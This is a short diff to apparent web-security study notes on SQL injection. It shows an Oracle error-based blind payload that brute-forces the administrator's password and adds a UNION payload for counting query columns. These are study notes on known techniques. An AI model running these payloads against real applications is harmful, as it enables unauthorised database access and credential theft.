@@ -115,3 +115,8 @@ Now we bruteforce as before
 `'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
 
 ### [Error Based SQLi](https://github.com/kymb0/web_study/blob/master/sqli/error_based_sqli.md)
+
+### Union
+SQL injection UNION attack, determining the number of columns returned by the query:
+`'+UNION+SELECT+NULL--`
+keep adding nulls until the page is returned
